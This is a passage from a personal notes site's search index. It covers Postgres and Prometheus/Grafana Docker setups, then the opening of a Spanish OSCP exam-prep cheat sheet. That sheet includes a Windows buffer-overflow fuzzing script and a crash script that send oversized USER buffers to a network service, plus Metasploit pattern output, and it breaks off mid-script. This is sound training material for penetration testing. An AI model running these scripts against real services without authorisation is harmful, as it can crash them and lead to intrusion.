time","text":"<p>To turn on query execution time, you use the <code>\\timing</code> command.</p> <pre><code>dvdrental=# \\timing\nTiming is on.\ndvdrental=# select count(*) from film;\n count\n-------\n  1000\n(1 row)\n\nTime: 1.495 ms\ndvdrental=#\n</code></pre> <p>You use the same command <code>\\timing</code> to turn it off.</p> <pre><code>dvdrental=# \\timing\nTiming is off.\ndvdrental=#\n</code></pre>"},{"location":"Postgres/compose/","title":"Compose","text":"<pre><code>version: \"3.8\"\nservices:\n  db:\n    image: postgres\n    container_name: local_pgdb\n    restart: always\n    healthcheck:\n      test: ['CMD', 'pg_isready', '-q', '-d', 'postgres', '-U', 'root']\n      timeout: 45s\n      interval: 10s\n      retries: 10\n    ports:\n      - \"54320:5432\"\n    environment:\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: admin\n      POSTGRES_DB: alg_database\n    volumes:\n      - local_pgdata:/var/lib/postgresql/data\n  pgadmin:\n    image: dpage/pgadmin4\n    container_name: pgadmin4_container\n    restart: always\n    ports:\n      - \"5050:80\"\n    environment:\n      PGADMIN_DEFAULT_EMAIL: raj@nola.com\n      PGADMIN_DEFAULT_PASSWORD: admin\n    volumes:\n      - pgadmin-data:/var/lib/pgadmin\n\nvolumes:\n  local_pgdata:\n  pgadmin-data:\n</code></pre>"},{"location":"Postgres/postgresScript/","title":"postgresScript","text":"<pre><code>#!/usr/bin/env bash\n\n# Create a txt file having these separate words db_variables.txt: \n# user_name user_password db_host db_port db_name db_schema\n# as separate columns. Call this script in bash shell as ./db_repopulate.sh $(cat db_variables.txt)\nuser_name=$1\nuser_password=$2\ndb_host=$3\ndb_port=$4\ndb_name=$5\ndb_schema=$6\n\n# Creates database with desired parameters.\nPGPASSWORD=$user_password psql -U $user_name -h $db_host -p $db_port -c \"CREATE DATABASE $db_name WITH ENCODING 'UTF8';\"\n\nif [[ \"$db_schema\" != \"public\" ]]\nthen\n    db_command_1=\"DROP SCHEMA IF EXISTS public CASCADE; DROP SCHEMA IF EXISTS $db_schema CASCADE;\"\n    db_command_2=\"CREATE SCHEMA IF NOT EXISTS public AUTHORIZATION $user_name; CREATE SCHEMA IF NOT EXISTS $db_schema AUTHORIZATION $user_name\"\nelse\n    db_command_1=\"DROP SCHEMA IF EXISTS public CASCADE;\"\n    db_command_2=\"CREATE SCHEMA IF NOT EXISTS public AUTHORIZATION $user_name;\"\nfi\n\nPGPASSWORD=$user_password psql -U $user_name -h $db_host -p $db_port -d $db_name -c \"$db_command_1$db_command_2\"\n\n# This populates our database.\n\nnpm run sequelize-config\n\nnpx sequelize-cli db:migrate\n\ncd sequelize/module2_sequelize_utils\nnode timezoneUTC.js\n\ncd ../..\nnpx sequelize-cli db:seed:all\n\ncd sequelize\nnode executeUtils.js\n</code></pre>"},{"location":"Postgres/postgres_command/","title":"Postgres command","text":"<p>Login usuario postgres:</p> <pre><code>$ sudo su - postgres\n</code></pre> <p>Creaci\u00f3n de un usuario:</p> <pre><code>CREATE USER nombre_usuario WITH password '123456'\n</code></pre> <p>Eliminar usuario:</p> <pre><code>DROP USER nombre_usuario\n</code></pre> <p>Crear base de datos:</p> <pre><code>CREATE DATABASE nombre_db WITH OWNER nombre_usuario;\n</code></pre> <p>Eliminar base de datos:</p> <pre><code>DROP DATABASE nombre_db\n</code></pre> <p>Acceder database con usuario x:</p> <pre><code>psql -U nombre_usuario nombre_db\n</code></pre> <p>Crear schema:</p> <pre><code>CREATE SCHEMA [IF NOT EXISTS] schema_name;\n\nIn this example, we will create a schema for a user (say, Raju). to do show let\u2019s first create a user using the below statement:\n</code></pre> <pre><code>CREATE USER Raju WITH ENCRYPTED PASSWORD 'Postgres123';\n</code></pre> <p>Crear schema autorizado</p> <pre><code>CREATE SCHEMA AUTHORIZATION Raju;\n</code></pre> <pre><code>CREATE SCHEMA IF NOT EXISTS geeksforgeeks AUTHORIZATION Raju;\n</code></pre> <p>Obtener ayuda:</p> <pre><code>\\h\n</code></pre> <p>Quit</p> <pre><code>\\q\n</code></pre> <p>Leer comandos desde un archivo:</p> <pre><code>\\i input.sql\n</code></pre> <p>Dump db a un archivo:</p> <pre><code>$ pg_dump -U nombre_usuario nombre_db &gt; db.out\n</code></pre> <p>Dump todas las bases de datos:</p> <pre><code>$ sudo su - postgres\n$ pg_dumpall &gt; /var/lib/pgsql/backups/dumpall.sql\n</code></pre> <p>Restaurar db:</p> <pre><code>$ sudo su - postgres\n$ psql -f /var/lib/pgsql/backups/dumpall.sql mydb\n</code></pre> <p>Tambi\u00e9n:</p> <pre><code>$ psql -U postgres nombredb &lt; archivo_restauracion.sql\n</code></pre> <p>List databases:</p> <pre><code>\\l\n</code></pre> <p>List tables in database:</p> <pre><code>\\d\n</code></pre> <p>Describe table:</p> <pre><code>\\d table_name\n</code></pre> <p>Describe table:</p> <pre><code>\\d+ table_name\n</code></pre> <p>Use database_name:</p> <pre><code>\\c nombre_db\n</code></pre> <p>Show users:</p> <pre><code>select * from \"pg_user\";\n# tambi\u00e9n\n\\du\n</code></pre> <p>Escribir las consultas en tu editor favorito:</p> <pre><code>\\e\n</code></pre> <p>Activar/Desactivar ver el tiempo del query:</p> <pre><code>\\timing\n</code></pre> <p>Reset a user password as admin:</p> <pre><code>ALTER USER usertochange WITH password 'new_passwd';\n</code></pre> <p>Select version</p> <pre><code>SELECT version();\n</code></pre> <p>Change Database Owner:</p> <pre><code>ALTER DATABASE database_name OWNER TO new_owner;\n</code></pre> <p>Create a superuser user:</p> <pre><code>ALTER USER mysuper WITH SUPERUSER;\n# or even better\nALTER USER mysuper WITH SUPERUSER CREATEDB CREATEROLE INHERIT LOGIN REPLICATION\n</code></pre> <p>Saber el tama\u00f1o usado las tablas en una base de datos:</p> <p>Ver mas: http://www.niwi.be/2013/02/17/postgresql-database-table-indexes-size/</p> <pre><code>SELECT pg_size_pretty(pg_database_size('dbname'));\n</code></pre> <p>Tama\u00f1o DB </p> <pre><code>SELECT pg_database.datname, pg_size_pretty(pg_database_size(pg_database.datname)) AS size FROM pg_database;\n</code></pre>"},{"location":"Postgres/replicaSetPost/","title":"replicaSetPost","text":""},{"location":"Postgres/replicaSetPost/#postgres-replicaset-docker-compose","title":"Postgres Replicaset docker compose","text":"<pre><code>version: '2'\n\nservices:\n  postgresql-master:\n    image: 'docker.io/bitnami/postgresql:11-debian-10'\n    ports:\n      - '5432:5432'\n    volumes:\n      - 'postgresql_master_data:/bitnami/postgresql'\n    environment:\n      - POSTGRESQL_PGAUDIT_LOG=READ,WRITE\n      - POSTGRESQL_LOG_HOSTNAME=true\n      - POSTGRESQL_REPLICATION_MODE=master\n      - POSTGRESQL_REPLICATION_USER=repl_user\n      - POSTGRESQL_REPLICATION_PASSWORD=repl_password\n      - POSTGRESQL_USERNAME=postgres\n      - POSTGRESQL_DATABASE=my_database\n      - ALLOW_EMPTY_PASSWORD=yes\n      - POSTGRESQL_PORT_NUMBER=5432\n  postgresql-slave:\n    image: 'docker.io/bitnami/postgresql:11-debian-10'\n    ports:\n      - '5433:5432'\n    depends_on:\n      - postgresql-master\n    environment:\n      - POSTGRESQL_USERNAME=postgres\n      - POSTGRESQL_PASSWORD=my_password\n      - POSTGRESQL_MASTER_HOST=postgresql-master\n      - POSTGRESQL_PGAUDIT_LOG=READ,WRITE\n      - POSTGRESQL_LOG_HOSTNAME=true\n      - POSTGRESQL_REPLICATION_MODE=slave\n      - POSTGRESQL_REPLICATION_USER=repl_user\n      - POSTGRESQL_REPLICATION_PASSWORD=repl_password\n      - POSTGRESQL_MASTER_PORT_NUMBER=5432\n      - POSTGRESQL_PORT_NUMBER=5432\nvolumes:\n  postgresql_master_data:\n    driver: local\n</code></pre>"},{"location":"Prometheus%20Grafana/Grafana/","title":"Grafana Docker","text":"<pre><code>docker run -d \\\n-p 2345:2345 \\\n--name grafana \\\n-e \"GF_SERVER_HTTP_PORT=2345\" \\\ngrafana/grafana\n</code></pre>"},{"location":"Prometheus%20Grafana/Grafana/#prometheus-docker","title":"Prometheus Docker","text":""},{"location":"Prometheus%20Grafana/Grafana/#node-exporter","title":"Node exporter","text":"<pre><code>docker run -d --net=\"host\" --pid=\"host\" -v \"/:/host:ro,rslave\" quay.io/prometheus/node-exporter:latest --path.rootfs=/host\n</code></pre>"},{"location":"Prometheus%20Grafana/Grafana/#prometheus","title":"Prometheus","text":"<pre><code>docker run -d --name prometheus -p 9090:9090 -v /home/gitlab-runner/MON/prometheus.yml:/etc/prometheus/prometheus.yml prom/prometheus --config.file=/etc/prometheus/prometheus.yml --web.enable-lifecycle\n</code></pre>"},{"location":"Prometheus%20Grafana/Grafana/#prometheusyml","title":"prometheus.yml","text":"<pre><code>global:\n  scrape_interval: 5s\n  external_labels:\n    monitor: 'node'\nscrape_configs:\n  - job_name: 'prometheus'\n    static_configs:\n      - targets: ['localhost:9090']\n  - job_name: 'node-exporter'\n    static_configs:\n      - targets: ['localhost:9100']\n</code></pre>"},{"location":"Prometheus%20Grafana/Grafana/#docker-compose","title":"Docker Compose","text":"<pre><code>---\n###########################################################\n# Description: Prometheus with Grafana to monit localhost #\n###########################################################\nversion: \"3\"\nvolumes:\n  grafana:\nservices:\n  prometheus:\n    image: prom/prometheus:latest\n    ports:\n      - \"9090:9090\"\n    volumes:\n      - ./prometheus:/etc/prometheus\n    command:\n      - \"--config.file=/etc/prometheus/prometheus.yml\"\n    restart: always\n  node-exporter:\n    image: prom/node-exporter:latest\n    volumes:\n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /:/rootfs:ro\n    command:\n      - \"--path.procfs=/host/proc\"\n      - \"--path.sysfs=/host/sys\"\n      - '--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)'\n    restart: always\n  grafana:\n    image: grafana/grafana:latest\n    ports:\n      - \"3000:3000\"\n    volumes:\n      - grafana:/var/lib/grafana\n    restart: always\n</code></pre>"},{"location":"Prometheus%20Grafana/Grafana/#prometheusyml_1","title":"prometheus.yml","text":"<pre><code>global:\n  scrape_interval:     15s\n  evaluation_interval: 15s\n\nscrape_configs:\n  - job_name: 'node-exporter'\n    static_configs:\n      - targets: ['node-exporter:9100']\n\n  - job_name: 'prometheus'\n    static_configs:\n      - targets: ['prometheus:9090']\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/","title":"Preparaci\u00f3n para el OSCP (by s4vitar)","text":""},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#penetration-testing-with-kali-linux-pwk-course-and-offensive-security-certified-professional-oscp-cheat-sheet","title":"Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet","text":""},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#indice-y-estructura-principal","title":"\u00cdndice y Estructura Principal","text":"<ul> <li>Antecedentes - Experiencia Personal</li> <li>Buffer Overflow Windows (25 puntos)<ul> <li>Fuzzing</li> <li>Calculando el Offset (Tama\u00f1o del B\u00faffer)</li> <li>Controlando el registro EIP</li> <li>Situando y Asignando Espacio al Shellcode</li> <li>Detectando los Badchars</li> <li>Generando el Shellcode</li> <li>Salto al ESP (Mona / Immunity Debugger)</li> <li>Mejorando el Exploit</li> <li>Reduciendo el Size y Acceso por Powershell</li> </ul> </li> <li> <p>Buffer Overflow Linux</p> <ul> <li>Calculando el Offset (Linux)</li> <li>Register Enumeration</li> <li>JMP ESP Opcode</li> <li>JMP EAX From ESP</li> <li>Msfvenom Linux Payload</li> <li>Ganando Acceso al Sistema</li> </ul> </li> <li> <p>Pentesting</p> <ul> <li>General</li> <li>Port Scanning</li> <li>Wfuzz</li> <li>Nikto</li> <li>Enumeraci\u00f3n SNMP</li> <li>Reverse Shell</li> <li>Spawning a TTY Shell</li> <li>Compilado de Exploits para Windows</li> <li>Squid Proxy</li> <li>Metasploit Debugging</li> <li>Pentesting Web</li> <li>LFI (Local File Inclusion)</li> <li>LFI (Local File Inclusion) Code Examples</li> <li>RFI (Remote File Inclusion)</li> <li>LFI to RCE</li> <li>LFI to RCE via PHP Sessions</li> <li>LFI to RCE via /proc/self/environ</li> <li>LFI RFI using Wrappers </li> <li>SQLI (SQL Inyection) </li> <li>Shellshock</li> <li>Padding Oracle Attack </li> <li>WordPress</li> <li>PHP Reverse Shell Manual Multifuncional </li> <li>ASP/ASPX Reverse Shell</li> <li>NoTCPShell </li> <li>Bypass File Upload Filtering</li> <li>XML External Entity Injection</li> <li>X-Jenkins Remote Code Execution</li> <li>PHP-CGI Exploitation</li> <li>WAF Bypassing</li> <li>Pentesting Linux<ul> <li>Tratamiento de la TTY</li> <li>Monitorizado de Procesos a Tiempo Real</li> <li>Escaping Restricted Shell</li> <li>Pivoting con Shuttle</li> <li>Port Knocking</li> </ul> </li> <li>Pentesting Windows<ul> <li>Transferencia de Archivos</li> <li>Evasi\u00f3n de Antivirus con Malware Gen\u00e9tico</li> <li>Port Forwarding y T\u00e9cnicas de Enrutamiento</li> <li>Hashdump Manual</li> <li>PassTheHash</li> <li>Enumeration &amp; Privilege Escalation</li> <li>Powershell Reverse Shell</li> <li>Migraci\u00f3n manual a proceso a 64 bits</li> <li>RCE Filter Evasion Microsoft SQL</li> <li>Conexi\u00f3n al Servicio Microsoft SQL con mssqclient.py de Impacket</li> <li>Reconocimiento del Sistema</li> <li>Kernel Exploits Windows</li> <li>Privilege Escalation Enumerations</li> </ul> </li> </ul> </li> </ul>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#antecedentes","title":"Antecedentes","text":"<p>Antes que nada me gustar\u00eda comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiraci\u00f3n para aquel que pretenda sacarse la certificaci\u00f3n.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#es-dificil-la-certificacion","title":"\u00bfEs dif\u00edcil la certificaci\u00f3n?","text":"<p>Dir\u00eda que la respuesta es relativa, siempre va a depender de la soltura que tengas con m\u00e1quinas de tipo CTF/Challenge. </p> <p>A mi por ejemplo la plataforma HackTheBox me ha servido de mucho para coger todo el fondo que tengo a d\u00eda de hoy, as\u00ed como VulnHub u OverTheWire. De hecho, lo que m\u00e1s me sorprendi\u00f3 a la hora de ir haciendo las m\u00e1quinas del laboratorio fue la gran similitud con las m\u00e1quinas de HackTheBox. Hablando en t\u00e9rminos comparativos, os puedo decir que efectivamente corresponden a las de nivel medio de HTB, tal y como llegu\u00e9 a leer en su momento en algunos art\u00edculos de gente que hab\u00eda pasado con \u00e9xito la certificaci\u00f3n.</p> <p>Eso si, la certificaci\u00f3n fue dura, de las m\u00e1s duras que he hecho en mi vida, con mis momentos de desesperaci\u00f3n en los que no llegaba a ver las cosas claras, sobre todo por la nueva modalidad Proctored, que quieras o no pone un poco nervioso. Mi consejo en este punto es que no tires nunca la toalla, ni aunque quede 1 hora de examen. De hecho, fue justamente 2 horas antes de acabar el examen cuando lo iba a dar todo por perdido hasta que se me ocurri\u00f3 un vector de ataque que milagrosamente funcion\u00f3 y logr\u00e9 explotar con \u00e9xito comprometiendo otro de los sistemas de la red (con escalada de privilegios incluido).</p> <p>Para que te quedes tranquilo, si juegas mucho con m\u00e1quinas de tipo CTF y te entrenas d\u00eda a d\u00eda con retos desafiantes que te hagan pensar, no tienes de qu\u00e9 preocuparte.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#que-plan-me-pillo","title":"\u00bfQu\u00e9 plan me pillo?","text":"<p>En mi caso me llegu\u00e9 a pillar el plan de 3 meses, lo que se resume en unos 1.100 euros practicamente. </p> <p>Os puedo decir que en 1 mes ya ten\u00eda casi todas las m\u00e1quinas hechas menos 4 de ellas que me siguieron quedando pendientes y no llegu\u00e9 a hacer (Eran las m\u00e1s Hard y vi que escapaban demasiado de la metodolog\u00eda del examen).</p> <p>El segundo mes lo utilic\u00e9 para seguir con HackTheBox as\u00ed como para repasar las m\u00e1quinas hechas y probar v\u00edas alternativas de resolver las mismas.</p> <p>En base a c\u00f3mo lo he vivido yo, os recomendar\u00eda m\u00e1s bien 2 meses de laboratorio, sobre todo por lo que me comentaba un gran compa\u00f1ero Julio Ure\u00f1a, de que uno tiende a relajarse cuando tiene mucho tiempo por delante.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#que-bases-tuve-antes-de-comenzar-con-la-certificacion","title":"\u00bfQu\u00e9 bases tuve antes de comenzar con la certificaci\u00f3n?","text":"<p>A nivel de Pentesting, en VulnHub ten\u00eda 30 m\u00e1quinas, en OverTheWire 6 de los retos principales y en HackTheBox 55 m\u00e1quinas con permisos de administrador en cada una de ellas.</p> <p>A nivel de Sistemas y programaci\u00f3n, con muy buenas bases de Linux Avanzado, programaci\u00f3n en Bash Avanzado y ligero tanto de Windows como de Python. S\u00ed que es cierto que la certificaci\u00f3n me hizo meterme m\u00e1s a fondo con Windows, as\u00ed como con la programaci\u00f3n en Python, de ah\u00ed me motiv\u00e9 de hecho para hacer la herramienta spoofMe para el Spoofing de llamadas y mensajer\u00eda instant\u00e1nea. </p> <p>A su vez a esto le sumo las auditor\u00edas reales de empresa que hago como Pentester en EnigmaSec, donde el hecho de practicar tambi\u00e9n en entornos reales me hace ver las cosas desde otra perspectiva.</p> <p>Por \u00faltimo, a nivel de B\u00faffer Overflow, no sab\u00eda hacer nada... entr\u00e9 con la mente en blanco a la certificaci\u00f3n. Sin embargo, en 4 d\u00edas ya sab\u00eda hacer todos los ejercicios del laboratorio en base a la gu\u00eda y a los v\u00eddeos de apoyo con los que cuentas en el material que te dan.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#que-horarios-de-estudio-seguias","title":"\u00bfQu\u00e9 horarios de estudio segu\u00edas?","text":"<p>Esto tal vez ha sido lo m\u00e1s mortal, desafiante, doloroso pero a su vez fruct\u00edfero. Estuve aplicando Uberman durante los 3 meses de preparaci\u00f3n, una t\u00e9cnica de sue\u00f1o polif\u00e1sico que hace que con tan s\u00f3lo dormir 3 horas seguidas aplicando posteriormente descansos de 20 minutos a intervalos regulares de tiempo puedas estar activo y despierto (Que no falten los que me conocen de cerca y me llamaban loco).</p> <p>Decid\u00ed aplicarlo porque b\u00e1sicamente el d\u00eda se pasaba muy r\u00e1pido, cuando uno est\u00e1 trabajando tiene prioridades y debe anteponer las tareas y proyectos frente a lo dem\u00e1s. Para poder dedicarle tiempo de estudio al laboratorio, estuve sobre todo el primer mes aplicando a fondo la t\u00e9cnica, estudiando y practicando aproximadamente desde las 7 de la tarde hasta las 5 de la ma\u00f1ana.</p> <p>He de decir que tambi\u00e9n es un gran pu\u00f1ado de motivaci\u00f3n lo que hace que est\u00e9s dispuesto a hacer esto, en caso contrario ni lo habr\u00eda intentado. A\u00fan as\u00ed no lo recomiendo hacer, pues es perjudicial para la salud, pero depender\u00e1 de cada cual como pretenda organizarse sus horas de estudio.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#que-pasos-me-recomiendas-para-abordar-con-exito-la-certificacion","title":"\u00bfQu\u00e9 pasos me recomiendas para abordar con \u00e9xito la certificaci\u00f3n?","text":"<p>En primer lugar hacerte una cuenta de HackTheBox, incluso te dir\u00eda de pagarte la cuenta VIP para tener acceso a las m\u00e1quinas retiradas. Tienes a tu disposici\u00f3n canales en Youtube como el de ippsec, que te explica paso a paso todas las m\u00e1quinas retiradas con t\u00e9cnicas bastante chulas tanto de explotaci\u00f3n en Windows como en Linux.</p> <p>Te recomiendo practicar en este tipo de entornos todo lo que puedas, pues son los que te har\u00e1n ver una vez comiences con el laboratorio que hay bastante similitud y que no es tan costoso. Para las m\u00e1quinas del laboratorio, te dar\u00e1s cuenta de que los entornos est\u00e1n un poco \"deprecated\", en el sentido de que son m\u00e1quinas algo antiguas con arquitectura de 32 bits. A la hora de abordar estas m\u00e1quinas, mi consejo es que no trates de explotarlas haciendo uso de exploits modernos, pues est\u00e1n pensadas para que practiques distintas v\u00edas de explotaci\u00f3n con t\u00e9cnicas no tan actuales, lo que hace que ganes m\u00e1s fondo.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#que-es-lo-mas-duro-de-la-certificacion","title":"\u00bfQu\u00e9 es lo m\u00e1s duro de la certificaci\u00f3n?","text":"<p>La gesti\u00f3n del tiempo. Mi recomendaci\u00f3n y por lo que he escuchado de los dem\u00e1s y coincido, es empezar con el B\u00faffer Overflow a la hora de abordar el examen. Teniendo cierta soltura no te deber\u00eda de llevar m\u00e1s de 1 hora.</p> <p>Una vez hecho, ya cuentas con 25 puntos del examen. El siguiente paso es saltar a la m\u00e1quina de 10 puntos, suele ser una explotaci\u00f3n r\u00e1pida y directa como administrador del sistema. Con estos 35 puntos bajo la manga, lo m\u00e1s recomendable es dedicarle un buen tiempo a la otra m\u00e1quina de 25 puntos, pues en caso de sacarla, estar\u00edas a 60 puntos y con conseguir el User de alguno de los otros 2 sistemas de 20 puntos ya estar\u00edas aprobado (Intenta aspirar a m\u00e1s y hazlas todas :P).</p> <p>En cuanto al laboratorio, es justamente el entorno deprecated lo que hace un poco tediosa la compilaci\u00f3n y ejecuci\u00f3n de exploits, pues en la mayor\u00eda de las veces te dar\u00e1 una petada de las importantes. Pero no te frustres, siempre con un poco de caf\u00e9 y buena actitud se saca.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#cuales-son-los-siguientes-pasos","title":"\u00bfCu\u00e1les son los siguientes pasos?","text":"<p>Como siempre, uno nunca debe dejar de hacer lo que le gusta... y a\u00fan me queda un pu\u00f1ado de cosas por aprender. Ser\u00e1 cuesti\u00f3n de seguir aprendiendo lo que har\u00e1 que aparezca una respuesta a esta pregunta.</p> <p>Sin m\u00e1s, \u00a1os dejo con toda la preparaci\u00f3n del curso!</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#buffer-overflow-windows","title":"Buffer Overflow Windows","text":"<p>A continuaci\u00f3n, se listan los pasos a seguir para la correcta explotaci\u00f3n del Buffer Overflow en Windows (32 bits). Para la examinaci\u00f3n, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios b\u00e1sicos y llevar esa misma metodolog\u00eda al examen.</p> <p>Servicios/M\u00e1quinas con los que practicar:</p> <ul> <li>SLMail 5.5 </li> <li>Minishare 1.4.1</li> <li>M\u00e1quina Brainpan de VulnHub</li> <li>Los 2 binarios personalizados compartidos en la m\u00e1quina Windows personal del laboratorio</li> </ul> <p>Generalmente, la metodolog\u00eda a seguir es la que se describe a continuaci\u00f3n.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#fuzzing","title":"Fuzzing","text":"<p>Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso pr\u00e1ctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexi\u00f3n v\u00eda TELNET desde nuestra m\u00e1quina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de b\u00faffer:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nbuffer = [\"A\"]\nipAddress = sys.argv[1]\n\nport = 4000\ncontador = 100\n\nwhile len(buffer) &lt; 30:\n  buffer.append(\"A\"*contador)\n  contador += 200\n\nfor strings in buffer:\n  try:\n    print \"Enviando %s bytes...\" % len(strings)\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ipAddress, port))\n    s.recv(1024)\n    s.send(\"USER \" + strings + '\\r\\n')\n    s.recv(1024)\n    s.close()\n  except:\n    print \"\\nError de conexi\u00f3n...\\n\"\n    sys.exit(0)\n</code></pre> <p>De esta forma, a trav\u00e9s de una lista, vamos almacenando en la variable buffer el caracter \"A\" un total 30 veces con un incremento para cada una de las iteraciones en 200. </p> <p>Esto es:</p> <p>[1 caracter \"A\", 100 caracteres \"A\", 300 caracteres \"A\", 500 caracteres \"A\", 700 caracteres \"A\", ...]</p> <p>Mientras tanto, desde Immunity Debugger, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en qu\u00e9 momento se produce una violaci\u00f3n de segmento.</p> <p>Cuando esto ocurra, deber\u00edamos ver como el registro EIP toma el valor (41414141), correspondiente al caracter \"A\" en hexadecimal.</p> <p>Lo bueno de haber creado la lista, es que podemos identificar r\u00e1pidamente entre qu\u00e9 valores se produce el B\u00faffer Overflow, en otras palabras, si vemos que tras la ejecuci\u00f3n de nuestro script en Python el \u00faltimo reporte que se hizo fue \"Enviando 700 bytes...\", lo conveniente es modificar nuestro script al siguiente contenido:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nbuffer = \"A\"*900\nipAddress = sys.argv[1]\n\nport = 4000\n\ntry:\n  print \"Enviando b\u00faffer...\"\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((ipAddress, port))\n  s.recv(1024)\n  s.send(\"USER \" + buffer + '\\r\\n')\n  s.recv(1024)\n  s.close()\nexcept:\n  print \"\\nError de conexi\u00f3n...\\n\"\n  sys.exit(0)\n</code></pre> <p>Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecuci\u00f3n de esta variante, Immunity Debugger directamente nos deber\u00eda reportar la violaci\u00f3n de segmento con el valor 41414141 en el registro EIP, lo cual hace que ya tengamos una aproximaci\u00f3n de tama\u00f1o del buffer permitido.</p> <p>Para que te quedes tranquilo, en el examen te entregar\u00e1n un script en Python a modo de PoC donde se aplica un desbordamiento de b\u00faffer sobre el servicio. Contando con esto, es simplemente ir haciendo los pasos que se enumeran a continuaci\u00f3n.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#calculando-el-offset","title":"Calculando el Offset","text":"<p>Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de qu\u00e9 tama\u00f1o tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades pattern_create y pattern_offset de Metasploit.</p> <p>La funcionalidad pattern_create nos permitir\u00e1 generar un pu\u00f1ado de caracteres aleatorios en base a una longitud fijada como criterio. </p> <p>Ejemplo:</p> <pre><code>$~ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100\n\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9\n</code></pre> <p>Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo \u00fanico que tendr\u00edamos que hacer es sustituir el caracter \"A\" de nuestra variable buffer por el contenido que pattern_create nos ha devuelto:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nbuffer = 